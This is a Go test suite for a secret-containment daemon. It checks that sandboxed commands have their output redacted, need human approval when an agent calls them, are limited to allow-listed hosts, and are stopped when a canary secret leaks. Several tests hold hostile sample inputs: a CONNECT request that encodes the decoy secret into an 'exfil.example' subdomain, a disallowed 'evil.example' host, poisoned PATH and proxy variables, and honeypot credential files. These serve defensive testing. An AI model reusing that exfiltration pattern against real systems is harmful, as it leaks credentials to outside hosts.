//go:build !windows

package control

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net"
	"net/netip"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/keylatch/keylatch/internal/audit"
	"github.com/keylatch/keylatch/internal/contained"
	"github.com/keylatch/keylatch/internal/exitcode"
	"github.com/keylatch/keylatch/internal/placeholder"
	"github.com/keylatch/keylatch/internal/policy/enforce"
	"github.com/keylatch/keylatch/internal/redactor"
	"github.com/keylatch/keylatch/internal/registry"
)

const containedSecret = "sk_live_CONTAINED-CANARY-0123456789abcdef"

type fakeChild struct {
	stdinR  *io.PipeReader
	stdinW  *io.PipeWriter
	outR    *io.PipeReader
	outW    *io.PipeWriter
	errR    *io.PipeReader
	errW    *io.PipeWriter
	done    chan struct{}
	killed  chan struct{}
	once    sync.Once
	mu      sync.Mutex
	exit    int
	signals []int
	resizes []contained.Winsize
	stdin   bytes.Buffer
	tty     bool
}

func newFakeChild(tty bool) *fakeChild {
	c := &fakeChild{done: make(chan struct{}), killed: make(chan struct{}), tty: tty}
	c.stdinR, c.stdinW = io.Pipe()
	c.outR, c.outW = io.Pipe()
	c.errR, c.errW = io.Pipe()
	go func() {
		buf := make([]byte, 4096)
		for {
			n, err := c.stdinR.Read(buf)
			c.mu.Lock()
			c.stdin.Write(buf[:n])
			c.mu.Unlock()
			if err != nil {
				return
			}
		}
	}()
	return c
}

func (c *fakeChild) finish(code int) {
	c.once.Do(func() {
		c.mu.Lock()
		c.exit = code
		c.mu.Unlock()
		_ = c.outW.Close()
		_ = c.errW.Close()
		close(c.done)
	})
}

func (c *fakeChild) Stdin() io.WriteCloser { return c.stdinW }
func (c *fakeChild) Stdout() io.Reader     { return c.outR }
func (c *fakeChild) Stderr() io.Reader {
	if c.tty {
		return nil
	}
	return c.errR
}
func (c *fakeChild) Resize(rows, cols uint16) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.resizes = append(c.resizes, contained.Winsize{Rows: rows, Cols: cols})
	return nil
}
func (c *fakeChild) Signal(sig int) error {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.signals = append(c.signals, sig)
	return nil
}
func (c *fakeChild) Kill() {
	select {
	case <-c.killed:
	default:
		close(c.killed)
	}
	c.finish(137)
}
func (c *fakeChild) Wait() (int, error) {
	<-c.done
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.exit, nil
}

type fakeLauncher struct {
	mu     sync.Mutex
	specs  []contained.Spec
	err    error
	script func(spec contained.Spec, c *fakeChild)
	last   *fakeChild
}

func (f *fakeLauncher) Start(spec contained.Spec) (contained.Child, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	if f.err != nil {
		return nil, f.err
	}
	f.specs = append(f.specs, spec)
	c := newFakeChild(spec.TTY != nil)
	f.last = c
	if f.script != nil {
		go f.script(spec, c)
	} else {
		go c.finish(0)
	}
	return c, nil
}

func (f *fakeLauncher) spec() contained.Spec {
	f.mu.Lock()
	defer f.mu.Unlock()
	if len(f.specs) == 0 {
		return contained.Spec{}
	}
	return f.specs[len(f.specs)-1]
}

func (f *fakeLauncher) started() int {
	f.mu.Lock()
	defer f.mu.Unlock()
	return len(f.specs)
}

type containedWorld struct {
	t        *testing.T
	srv      *Server
	audit    *recordingAudit
	launcher *fakeLauncher
	project  string
	egress   chan net.Listener
	asked    []ApprovalRequest
	approve  func(ApprovalRequest) (string, error)
	decide   func(enforce.Request) enforce.Decision
	decided  []enforce.Request
	dial     func(ctx context.Context, network, addr string) (net.Conn, error)
	mu       sync.Mutex
}

func newContainedWorld(t *testing.T) *containedWorld {
	t.Helper()
	base, err := os.MkdirTemp("/tmp", "klcw")
	require.NoError(t, err)
	t.Cleanup(func() { _ = os.RemoveAll(base) })
	state := filepath.Join(base, "state")
	project := filepath.Join(base, "project")
	for _, d := range []string{filepath.Join(state, "gateway"), project, filepath.Join(base, "runs")} {
		require.NoError(t, os.MkdirAll(d, 0o700))
	}
	env := map[string]string{"KEYLATCH_CONFIG_DIR": state, "KEYLATCH_SOCKET": filepath.Join(base, "s", "k.sock")}
	require.NoError(t, registry.InitFromConfig(context.Background(), lookupOf(env)))

	w := &containedWorld{t: t, audit: &recordingAudit{}, launcher: &fakeLauncher{}, project: project, egress: make(chan net.Listener, 4)}
	w.decide = func(enforce.Request) enforce.Decision {
		return enforce.Decision{Allow: true, Approval: "auto", Source: "connection-policy"}
	}
	w.srv = NewServer(Config{
		Env:   lookupOf(env),
		Audit: w.audit,
		Decide: func(_ context.Context, r enforce.Request) enforce.Decision {
			w.mu.Lock()
			defer w.mu.Unlock()
			w.decided = append(w.decided, r)
			return w.decide(r)
		},
		Approve: func(_ context.Context, r ApprovalRequest) (string, error) {
			w.mu.Lock()
			w.asked = append(w.asked, r)
			f := w.approve
			w.mu.Unlock()
			if f == nil {
				return "", errors.New("no approver")
			}
			return f(r)
		},
		Contained: &ContainedConfig{
			Launcher: w.launcher,
			Values: func(_ context.Context, _, field string) ([]byte, error) {
				if field == "secret_key" {
					return []byte(containedSecret), nil
				}
				return []byte("whsec_" + field), nil
			},
			StateDir: filepath.Join(base, "runs"),
			Listen: func(string) (net.Listener, error) {
				l, err := net.Listen("tcp", "127.0.0.1:0")
				if err == nil {
					w.egress <- l
				}
				return l, err
			},
			Resolver: fakeNames{"api.stripe.com": {"93.184.216.34"}, "evil.example": {"93.184.216.99"}},
			Dial: func(ctx context.Context, network, addr string) (net.Conn, error) {
				w.mu.Lock()
				d := w.dial
				w.mu.Unlock()
				if d == nil {
					return nil, errors.New("no network in this test")
				}
				return d(ctx, network, addr)
			},
			Report: func() contained.Report {
				return contained.Report{Capabilities: []contained.Capability{{Name: "user_namespace", Detail: "denied by the test"}}}
			},
		},
	})
	return w
}

type fakeNames map[string][]string

func (f fakeNames) LookupNetIP(_ context.Context, _, host string) ([]netip.Addr, error) {
	var out []netip.Addr
	for _, s := range f[host] {
		a, err := netip.ParseAddr(s)
		if err != nil {
			return nil, err
		}
		out = append(out, a)
	}
	if len(out) == 0 {
		return nil, errors.New("no such host")
	}
	return out, nil
}

// connect opens a connection pair, serves the server side and returns the
// client side. Signals make the caller an agent.
func (w *containedWorld) connect(ctx context.Context) *net.UnixConn {
	w.t.Helper()
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	require.NoError(w.t, err)
	mk := func(fd int) *net.UnixConn {
		f := os.NewFile(uintptr(fd), "pair")
		c, err := net.FileConn(f)
		require.NoError(w.t, err)
		_ = f.Close()
		return c.(*net.UnixConn)
	}
	client, server := mk(fds[0]), mk(fds[1])
	go func() {
		defer func() { _ = server.Close() }()
		w.srv.handle(ctx, server)
	}()
	w.t.Cleanup(func() { _ = client.Close() })
	return client
}

type runResult struct {
	first  Response
	stdout string
	stderr string
	final  Response
}

func (w *containedWorld) runRaw(req Request, during func(conn *net.UnixConn, first Response)) runResult {
	w.t.Helper()
	conn := w.connect(context.Background())
	require.NoError(w.t, writeFrame(conn, req))
	r := bufio.NewReader(conn)
	_ = conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	var res runResult
	var out, errOut bytes.Buffer
	require.NoError(w.t, readFrame(r, &res.first, maxFrame))
	if !res.first.More {
		res.final = res.first
		return res
	}
	if during != nil {
		during(conn, res.first)
	}
	for {
		var resp Response
		require.NoError(w.t, readFrame(r, &resp, maxFrame))
		out.Write(resp.Stdout)
		errOut.Write(resp.Stderr)
		if !resp.More {
			res.final = resp
			break
		}
	}
	res.stdout, res.stderr = out.String(), errOut.String()
	return res
}

func (w *containedWorld) request(command ...string) Request {
	if len(command) == 0 {
		command = []string{"make", "test"}
	}
	return Request{Op: OpContained, Run: &RunRequest{Connection: "stripe", Tier: TierContained, Command: command, CWD: w.project}}
}

func agentRequest(r Request) Request {
	r.Signals = []string{"CLAUDECODE"}
	return r
}

func (w *containedWorld) events(action audit.Action) []audit.Event {
	w.audit.mu.Lock()
	defer w.audit.mu.Unlock()
	var out []audit.Event
	for _, e := range w.audit.events {
		if e.Action == action {
			out = append(out, e)
		}
	}
	return out
}

func TestContainedRunRelaysRedactedOutputAndExitStatus(t *testing.T) {
	w := newContainedWorld(t)
	w.launcher.script = func(spec contained.Spec, c *fakeChild) {
		_, _ = fmt.Fprintf(c.outW, "plain=%s\n", containedSecret)
		_, _ = fmt.Fprintf(c.outW, "b64=%s\n", base64.StdEncoding.EncodeToString([]byte(containedSecret)))
		_, _ = fmt.Fprintf(c.errW, "err=%s\n", containedSecret)
		c.finish(4)
	}
	res := w.runRaw(w.request("make", "test"), nil)

	require.True(t, res.first.OK, res.first.Error)
	assert.Equal(t, TierContained, res.first.Session.Tier)
	assert.Equal(t, "contained", res.first.Session.Runtime)
	assert.NotEmpty(t, res.first.Session.RunID)
	assert.NotContains(t, res.stdout, containedSecret)
	assert.NotContains(t, res.stdout, base64.StdEncoding.EncodeToString([]byte(containedSecret)))
	assert.NotContains(t, res.stderr, containedSecret)
	assert.Contains(t, res.stdout, "plain=")
	assert.Equal(t, 4, res.final.ExitCode)
	assert.False(t, res.final.OK)

	spec := w.launcher.spec()
	assert.Equal(t, []string{"make", "test"}, spec.Argv)
	assert.Contains(t, spec.Env, "STRIPE_SECRET_KEY="+containedSecret, "the child gets the real value")
	assert.Contains(t, spec.Env, "HTTPS_PROXY=http://127.0.0.1:3128")
	assert.Contains(t, spec.Env, "HOME="+contained.DefaultHome)
	for _, e := range spec.Env {
		assert.False(t, strings.HasPrefix(e, "KEYLATCH_SOCKET"), "Keylatch configuration never reaches the child: %s", e)
	}
	realProject, _ := filepath.EvalSymlinks(w.project)
	assert.Equal(t, realProject, spec.Project)
	assert.Equal(t, realProject, spec.Dir)

	decided := w.events(audit.ActionRunDecided)
	require.Len(t, decided, 1)
	ex := decided[0].Extra
	assert.Equal(t, "D5", ex["tier"])
	assert.Equal(t, "daemon", ex["child_location"])
	assert.Equal(t, "stripe", ex["connection"])
	assert.NotEmpty(t, ex["sandbox_sha256"])
	assert.Equal(t, []string{"api.stripe.com", "files.stripe.com"}, ex["hosts"])
	assert.NotContains(t, fmt.Sprint(decided[0]), containedSecret)

	exited := w.events(audit.ActionRunExited)
	require.Len(t, exited, 1)
	assert.EqualValues(t, 4, exited[0].Extra["exit"])
	assert.EqualValues(t, 3, exited[0].Extra["redactions"])
	for _, e := range w.audit.events {
		assert.NotContains(t, fmt.Sprint(e), containedSecret, "no audit event holds the value")
	}
}

func TestContainedRunDecidesAgainstThePolicyEngine(t *testing.T) {
	w := newContainedWorld(t)
	res := w.runRaw(w.request("true"), nil)
	require.True(t, res.final.OK, res.final.Error)
	require.Len(t, w.decided, 1)
	got := w.decided[0]
	assert.Equal(t, "stripe", got.Connection)
	assert.Equal(t, "contained", got.Runtime)
	assert.Equal(t, "D5", got.Tier)
	assert.Equal(t, []string{"true"}, got.Command)
	assert.Equal(t, w.project, got.CWD)
}

func TestContainedRunRefusals(t *testing.T) {
	for name, tc := range map[string]struct {
		mutate func(*containedWorld, *Request)
		code   string
		exit   int
		reason string
	}{
		"policy denies": {func(w *containedWorld, _ *Request) {
			w.decide = func(enforce.Request) enforce.Decision {
				return enforce.Decision{Reason: "connection denies human callers"}
			}
		}, CodeRefused, exitcode.PolicyDeny, "connection denies human callers"},
		"no policy engine":   {func(w *containedWorld, _ *Request) { w.srv.cfg.Decide = nil }, CodeRefused, exitcode.PolicyDeny, "needs a policy engine"},
		"no launcher":        {func(w *containedWorld, _ *Request) { w.srv.cfg.Contained.Launcher = nil }, CodeUnavailable, exitcode.RuntimeNotAvailable, "no sandbox launcher"},
		"no contained":       {func(w *containedWorld, _ *Request) { w.srv.cfg.Contained = nil }, CodeUnavailable, exitcode.RuntimeNotAvailable, "no sandbox launcher"},
		"unknown connection": {func(_ *containedWorld, r *Request) { r.Run.Connection = "nope-nope" }, CodeNotFound, exitcode.Missing, "unknown connection"},
		"no command":         {func(_ *containedWorld, r *Request) { r.Run.Command = nil }, CodeBadRequest, exitcode.UserError, "required"},
		"wrong runtime":      {func(_ *containedWorld, r *Request) { r.Run.Runtime = "placeholder" }, CodeBadRequest, exitcode.UserError, "does not take"},
		"NUL in argv":        {func(_ *containedWorld, r *Request) { r.Run.Command = []string{"a\x00b"} }, CodeBadRequest, exitcode.UserError, "NUL"},
		"no cwd":             {func(_ *containedWorld, r *Request) { r.Run.CWD = "" }, CodeBadRequest, exitcode.UserError, "working directory"},
		"missing cwd":        {func(w *containedWorld, r *Request) { r.Run.CWD = filepath.Join(w.project, "gone") }, CodeBadRequest, exitcode.UserError, "working directory"},
		"root as project":    {func(_ *containedWorld, r *Request) { r.Run.CWD = "/" }, CodeRefused, exitcode.PolicyDeny, "cannot be the project"},
		"project holds state": {func(w *containedWorld, r *Request) {
			r.Run.CWD = filepath.Dir(w.project)
		}, CodeRefused, exitcode.PolicyDeny, "not available to contained runs"},
		"policy write scope": {func(w *containedWorld, _ *Request) {
			w.decide = func(enforce.Request) enforce.Decision {
				return enforce.Decision{Allow: true, Approval: "auto", FSWrite: []string{"/somewhere/else"}}
			}
		}, CodeRefused, exitcode.PolicyDeny, "does not allow writes"},
		"policy reads credentials": {func(w *containedWorld, _ *Request) {
			home, _ := os.UserHomeDir()
			w.decide = func(enforce.Request) enforce.Decision {
				return enforce.Decision{Allow: true, Approval: "auto", FSRead: []string{home}}
			}
		}, CodeRefused, exitcode.PolicyDeny, "holds credentials"},
	} {
		t.Run(name, func(t *testing.T) {
			w := newContainedWorld(t)
			req := w.request()
			tc.mutate(w, &req)
			res := w.runRaw(req, nil)
			assert.False(t, res.final.OK)
			assert.Equal(t, tc.code, res.final.Code)
			assert.Equal(t, tc.exit, res.final.ExitCode)
			assert.Contains(t, res.final.Error, tc.reason)
			assert.Zero(t, w.launcher.started(), "nothing starts when a request is refused")
			decided := w.events(audit.ActionRunDecided)
			require.Len(t, decided, 1)
			assert.Equal(t, audit.OutcomeDenied, decided[0].Outcome)
		})
	}
}

func TestContainedRunNeedsAnApprovalFromAgentCallers(t *testing.T) {
	w := newContainedWorld(t)
	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true} }

	// No approver at all.
	w.srv.cfg.Approve = nil
	res := w.runRaw(agentRequest(w.request("pnpm", "test")), nil)
	assert.Equal(t, exitcode.ApprovalRequired, res.final.ExitCode)
	assert.Contains(t, res.final.Error, "cannot collect one")
	assert.Zero(t, w.launcher.started())
}

func TestContainedRunApprovalIsBoundToTheRun(t *testing.T) {
	w := newContainedWorld(t)
	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true} }
	w.approve = func(r ApprovalRequest) (string, error) { return "apr-1", nil }
	res := w.runRaw(agentRequest(w.request("pnpm", "test")), nil)
	require.True(t, res.final.OK, res.final.Error)

	require.Len(t, w.asked, 1)
	asked := w.asked[0]
	assert.Equal(t, "stripe", asked.Connection)
	assert.Equal(t, TierContained, asked.Tier)
	assert.Equal(t, []string{"pnpm", "test"}, asked.Argv)
	assert.Equal(t, []string{"api.stripe.com", "files.stripe.com"}, asked.Hosts)
	assert.Equal(t, containedMaxRun, asked.TTL)
	assert.Equal(t, KindAgent, asked.Caller)
	assert.Equal(t, digest("pnpm", "test"), asked.ArgvDigest())
	assert.Contains(t, asked.Plan, "pnpm test")
	assert.Contains(t, asked.Plan, "api.stripe.com, files.stripe.com")
	assert.Contains(t, asked.Plan, w.project)

	decided := w.events(audit.ActionRunDecided)
	require.Len(t, decided, 1)
	assert.Equal(t, "apr-1", decided[0].Extra["approval_id"])
}

func TestContainedRunRefusedApprovalStartsNothing(t *testing.T) {
	w := newContainedWorld(t)
	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true} }
	w.approve = func(ApprovalRequest) (string, error) { return "", errors.New("the human said no") }
	res := w.runRaw(agentRequest(w.request()), nil)
	assert.Equal(t, exitcode.ApprovalRequired, res.final.ExitCode)
	assert.Contains(t, res.final.Error, "the human said no")
	assert.Zero(t, w.launcher.started())
}

func TestContainedRunHumanSkipsApprovalUnlessPolicyAsks(t *testing.T) {
	w := newContainedWorld(t)
	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true} }
	require.True(t, w.runRaw(w.request(), nil).final.OK)
	assert.Empty(t, w.asked)

	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true, Approval: "ask"} }
	w.approve = func(ApprovalRequest) (string, error) { return "apr-2", nil }
	require.True(t, w.runRaw(w.request(), nil).final.OK)
	assert.Len(t, w.asked, 1)
}

func TestContainedRunPolicyCanPreApproveAnAgent(t *testing.T) {
	w := newContainedWorld(t)
	w.decide = func(enforce.Request) enforce.Decision { return enforce.Decision{Allow: true, Approval: "auto"} }
	require.True(t, w.runRaw(agentRequest(w.request()), nil).final.OK)
	assert.Empty(t, w.asked)
}

func TestContainedRunReportsALauncherFailureWithTheMissingCapabilities(t *testing.T) {
	w := newContainedWorld(t)
	w.launcher.err = errors.New("clone: operation not permitted")
	res := w.runRaw(w.request(), nil)
	assert.Equal(t, CodeUnavailable, res.final.Code)
	assert.Equal(t, exitcode.RuntimeNotAvailable, res.final.ExitCode)
	assert.Contains(t, res.final.Error, "operation not permitted")
	assert.Contains(t, res.final.Error, "user_namespace: denied by the test")
	exited := w.events(audit.ActionRunExited)
	require.Len(t, exited, 1)
	assert.Equal(t, "sandbox unavailable", exited[0].Extra["reason"])
}

func TestContainedRunReportsAValueThatCannotBeRead(t *testing.T) {
	w := newContainedWorld(t)
	w.srv.cfg.Contained.Values = func(context.Context, string, string) ([]byte, error) { return nil, errors.New("vault locked") }
	res := w.runRaw(w.request(), nil)
	assert.Equal(t, CodeUnavailable, res.final.Code)
	assert.Contains(t, res.final.Error, "could not read stripe.secret_key")
	assert.NotContains(t, res.final.Error, "vault locked", "backend errors may name items and stay in the daemon")
	assert.Zero(t, w.launcher.started())
}

func TestContainedRunFlagsASecretWrittenIntoTheProject(t *testing.T) {
	w := newContainedWorld(t)
	w.launcher.script = func(spec contained.Spec, c *fakeChild) {
		_ = os.WriteFile(filepath.Join(spec.Project, "dump.txt"), []byte("key="+containedSecret), 0o600)
		_ = os.WriteFile(filepath.Join(spec.Project, "encoded.txt"), []byte(base64.StdEncoding.EncodeToString([]byte(containedSecret))), 0o600)
		_ = os.WriteFile(filepath.Join(spec.Project, "clean.txt"), []byte("nothing here"), 0o600)
		c.finish(0)
	}
	res := w.runRaw(w.request(), nil)
	assert.False(t, res.final.OK)
	assert.Equal(t, exitcode.PolicyDeny, res.final.ExitCode, "a leak makes the run exit 3")
	assert.Contains(t, res.final.Error, "2 file(s)")
	assert.Contains(t, res.final.Error, "dump.txt")
	assert.NotContains(t, res.final.Error, "clean.txt")

	leaks := w.events(audit.ActionContainedLeakSuspected)
	require.Len(t, leaks, 1)
	assert.EqualValues(t, 2, leaks[0].Extra["files"])
	assert.Equal(t, audit.OutcomeDenied, leaks[0].Outcome)
	assert.NotContains(t, fmt.Sprint(leaks[0]), containedSecret)
	exited := w.events(audit.ActionRunExited)
	require.Len(t, exited, 1)
	assert.Equal(t, "leak_suspected", exited[0].Extra["reason"])
}

func TestContainedRunForwardsInputResizeAndSignals(t *testing.T) {
	w := newContainedWorld(t)
	release := make(chan struct{})
	w.launcher.script = func(spec contained.Spec, c *fakeChild) {
		<-release
		c.finish(0)
	}
	req := w.request()
	req.Run.TTY = &contained.Winsize{Rows: 24, Cols: 80}
	res := w.runRaw(req, func(conn *net.UnixConn, first Response) {
		require.NoError(t, writeFrame(conn, Chunk{Data: []byte("typed input")}))
		require.NoError(t, writeFrame(conn, Chunk{Resize: &contained.Winsize{Rows: 50, Cols: 132}}))
		require.NoError(t, writeFrame(conn, Chunk{Signal: int(syscall.SIGTERM)}))
		require.NoError(t, writeFrame(conn, Chunk{EOF: true}))
		require.Eventually(t, func() bool {
			c := w.launcher.last
			c.mu.Lock()
			defer c.mu.Unlock()
			return c.stdin.String() == "typed input" && len(c.signals) == 1 && len(c.resizes) == 1
		}, 5*time.Second, 10*time.Millisecond)
		close(release)
	})
	require.True(t, res.final.OK)
	c := w.launcher.last
	assert.Equal(t, []int{int(syscall.SIGTERM)}, c.signals)
	assert.Equal(t, []contained.Winsize{{Rows: 50, Cols: 132}}, c.resizes)
	assert.Equal(t, &contained.Winsize{Rows: 24, Cols: 80}, w.launcher.spec().TTY)
}

func TestContainedRunKillsTheChildWhenTheClientDisconnects(t *testing.T) {
	w := newContainedWorld(t)
	w.launcher.script = func(contained.Spec, *fakeChild) {}
	conn := w.connect(context.Background())
	require.NoError(t, writeFrame(conn, w.request()))
	r := bufio.NewReader(conn)
	var first Response
	require.NoError(t, readFrame(r, &first, maxFrame))
	require.True(t, first.More)
	_ = conn.Close()
	select {
	case <-w.launcher.last.killed:
	case <-time.After(10 * time.Second):
		t.Fatal("the sandbox kept running after its client went away")
	}
}

func TestContainedEgressAllowsTheBoundHostAndRefusesTheRest(t *testing.T) {
	w := newContainedWorld(t)
	upstreamHit := make(chan string, 4)
	w.dial = func(_ context.Context, _, addr string) (net.Conn, error) {
		upstreamHit <- addr
		a, b := net.Pipe()
		go func() { defer func() { _ = b.Close() }(); _, _ = io.WriteString(b, "hello") }()
		return a, nil
	}
	release := make(chan struct{})
	w.launcher.script = func(contained.Spec, *fakeChild) {}
	conn := w.connect(context.Background())
	require.NoError(t, writeFrame(conn, w.request()))
	r := bufio.NewReader(conn)
	var first Response
	require.NoError(t, readFrame(r, &first, maxFrame))
	require.True(t, first.More)
	var l net.Listener
	select {
	case l = <-w.egress:
	case <-time.After(5 * time.Second):
		t.Fatal("the egress socket was never opened")
	}

	proxy := func(target string) string {
		c, err := net.Dial("tcp", l.Addr().String())
		require.NoError(t, err)
		defer func() { _ = c.Close() }()
		_ = c.SetDeadline(time.Now().Add(5 * time.Second))
		_, _ = fmt.Fprintf(c, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
		b, _ := io.ReadAll(c)
		return string(b)
	}
	assert.Contains(t, proxy("api.stripe.com:443"), "200 Connection Established")
	assert.Equal(t, "93.184.216.34:443", <-upstreamHit)
	assert.Contains(t, proxy("evil.example:443"), "403")
	assert.Len(t, upstreamHit, 0, "the refused host was never dialed")

	denied := w.events(audit.ActionEgressDenied)
	require.Len(t, denied, 1)
	assert.Equal(t, "evil.example", denied[0].Extra["host"])
	assert.Equal(t, "not_allowed", denied[0].Extra["reason"])
	close(release)
	w.launcher.last.finish(0)
	for {
		var resp Response
		require.NoError(t, readFrame(r, &resp, maxFrame))
		if !resp.More {
			break
		}
	}
}

func TestContainedEnvCarriesOnlyWhatWasOffered(t *testing.T) {
	rr := &RunRequest{Env: []string{
		"TERM=xterm-256color", "LANG=C.UTF-8", "LC_ALL=C", "KEYLATCH_SOCKET=/x", "PATH=/evil", "HOME=/evil", "HTTPS_PROXY=http://evil",
		"MY_FLAG=1", "1BAD=x", "NOEQUALS",
	}}
	env := containedEnv(rr, map[string][]byte{"STRIPE_SECRET_KEY": []byte(containedSecret)}, "/home/keylatch")
	assert.True(t, slices.IsSorted(env))
	for _, want := range []string{"TERM=xterm-256color", "LANG=C.UTF-8", "LC_ALL=C", "MY_FLAG=1", "STRIPE_SECRET_KEY=" + containedSecret,
		"HOME=/home/keylatch", "HTTPS_PROXY=http://127.0.0.1:3128", "NODE_USE_ENV_PROXY=1"} {
		assert.Contains(t, env, want)
	}
	for _, bad := range []string{"KEYLATCH_SOCKET=/x", "PATH=/evil", "HOME=/evil", "HTTPS_PROXY=http://evil", "1BAD=x"} {
		assert.NotContains(t, env, bad)
	}
	path := ""
	for _, e := range env {
		if strings.HasPrefix(e, "PATH=") {
			path = e
		}
	}
	assert.Equal(t, "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", path)
}

func TestWithinAndReaches(t *testing.T) {
	assert.True(t, within("/a/b", "/a"))
	assert.True(t, within("/a", "/a"))
	assert.False(t, within("/ab", "/a"))
	assert.False(t, within("/a", "/a/b"))
	assert.True(t, reaches("/a", "/a/b"), "a bind of /a would expose /a/b")
	assert.True(t, reaches("/a/b/c", "/a/b"))
	assert.False(t, reaches("/x", "/a/b"))
}

func TestOfferedEnv(t *testing.T) {
	lookup := lookupOf(map[string]string{"FOO": "bar", "EMPTY": ""})
	got := offeredEnv(lookup, []string{"TERM=xterm", "SECRET=v", "LC_ALL=C", "LANG=en"}, []string{"FOO", "EMPTY", "ABSENT"})
	assert.Equal(t, []string{"TERM=xterm", "LC_ALL=C", "LANG=en", "FOO=bar"}, got)
}

func TestTerminalSizeOfANonTerminal(t *testing.T) {
	_, ok := terminalSize(nil)
	assert.False(t, ok)
	f, err := os.Open(os.DevNull)
	require.NoError(t, err)
	defer func() { _ = f.Close() }()
	_, ok = terminalSize(f)
	assert.False(t, ok)
}

func TestSessionRequestsRefuseTierD5(t *testing.T) {
	w := newContainedWorld(t)
	var resp Response
	conn := w.connect(context.Background())
	require.NoError(t, writeFrame(conn, Request{Op: OpRunSession, Run: &RunRequest{Connection: "stripe", Tier: TierContained, Command: []string{"true"}}}))
	require.NoError(t, readFrame(bufio.NewReader(conn), &resp, maxFrame))
	assert.False(t, resp.OK)
	assert.Contains(t, resp.Error, "contained run")
}

func TestPlanDigestChangesWithTheSandbox(t *testing.T) {
	base := &containedPlan{project: "/p", hosts: []string{"a:443"}, spec: contained.Spec{Argv: []string{"x"}}}
	same := &containedPlan{project: "/p", hosts: []string{"a:443"}, spec: contained.Spec{Argv: []string{"x"}}}
	assert.Equal(t, planDigest(base), planDigest(same))
	for _, other := range []*containedPlan{
		{project: "/q", hosts: []string{"a:443"}, spec: contained.Spec{Argv: []string{"x"}}},
		{project: "/p", hosts: []string{"b:443"}, spec: contained.Spec{Argv: []string{"x"}}},
		{project: "/p", hosts: []string{"a:443"}, spec: contained.Spec{Argv: []string{"y"}}},
		{project: "/p", hosts: []string{"a:443"}, spec: contained.Spec{Argv: []string{"x"}, TTY: &contained.Winsize{Rows: 1, Cols: 1}}},
	} {
		assert.NotEqual(t, planDigest(base), planDigest(other))
	}
	assert.Equal(t, "none", hostList(nil))
	assert.Equal(t, "a, b", hostList([]string{"a", "b"}))
	var many []redactor.Finding
	for i := range 7 {
		many = append(many, redactor.Finding{Path: fmt.Sprintf("/r/f%d", i)})
	}
	assert.Equal(t, "f0, f1, f2, f3, f4, and 2 more", findingPaths(many, "/r"))
}

func TestContainedRunEndsWhenADecoyLeavesTheSandbox(t *testing.T) {
	w := newContainedWorld(t)
	w.launcher.script = func(contained.Spec, *fakeChild) {}
	conn := w.connect(context.Background())
	require.NoError(t, writeFrame(conn, w.request()))
	r := bufio.NewReader(conn)
	var first Response
	require.NoError(t, readFrame(r, &first, maxFrame))
	require.True(t, first.More)

	spec := w.launcher.spec()
	var decoy string
	for _, e := range spec.Env {
		if v, ok := strings.CutPrefix(e, "KEYLATCH_CANARY_STRIPE="); ok {
			decoy = v
		}
	}
	require.NotEmpty(t, decoy, "the sandbox is given a canary")
	paths := map[string]string{}
	for _, h := range spec.Honey {
		paths[h.Path] = h.Content
	}
	assert.Contains(t, paths, ".aws/credentials")
	assert.Contains(t, paths, ".npmrc")

	l := <-w.egress
	c, err := net.Dial("tcp", l.Addr().String())
	require.NoError(t, err)
	_ = c.SetDeadline(time.Now().Add(5 * time.Second))
	_, _ = fmt.Fprintf(c, "CONNECT %s.exfil.example:443 HTTP/1.1\r\nHost: x\r\n\r\n", decoy)
	out, _ := io.ReadAll(c)
	_ = c.Close()
	assert.Contains(t, string(out), "403")

	select {
	case <-w.launcher.last.killed:
	case <-time.After(10 * time.Second):
		t.Fatal("the run kept going after a decoy left the sandbox")
	}
	var final Response
	for {
		require.NoError(t, readFrame(r, &final, maxFrame))
		if !final.More {
			break
		}
	}
	assert.Equal(t, exitcode.SecurityBlock, final.ExitCode)
	assert.Contains(t, final.Error, "canary")
	tripped := w.events(audit.ActionCanaryTripped)
	require.Len(t, tripped, 1)
	assert.Equal(t, "connect_target", tripped[0].Extra["where"])
	assert.NotContains(t, fmt.Sprint(tripped[0]), decoy)
	exited := w.events(audit.ActionRunExited)
	require.Len(t, exited, 1)
	assert.Equal(t, "canary_tripped", exited[0].Extra["reason"])
}

func TestPlaceholderSessionCarriesACanary(t *testing.T) {
	w := newContainedWorld(t)
	mgr, err := placeholder.NewManager(placeholder.Config{Resolver: fixedResolver{"secret_key": containedSecret}, Audit: w.audit})
	require.NoError(t, err)
	t.Cleanup(mgr.Close)
	w.srv.cfg.Placeholders = mgr

	conn := w.connect(context.Background())
	require.NoError(t, writeFrame(conn, Request{Op: OpRunSession, Run: &RunRequest{Connection: "stripe", Tier: TierPlaceholder, Command: []string{"true"}}}))
	var resp Response
	require.NoError(t, readFrame(bufio.NewReader(conn), &resp, maxFrame))
	require.True(t, resp.OK, resp.Error)
	var canaryEnv string
	for _, e := range resp.Session.Env.Set {
		if e.Name == "KEYLATCH_CANARY_STRIPE" {
			canaryEnv = e.Value
		}
	}
	assert.True(t, strings.HasPrefix(canaryEnv, "klc-canary-stripe-"), "the placeholder session sets a canary beside its placeholders")
}
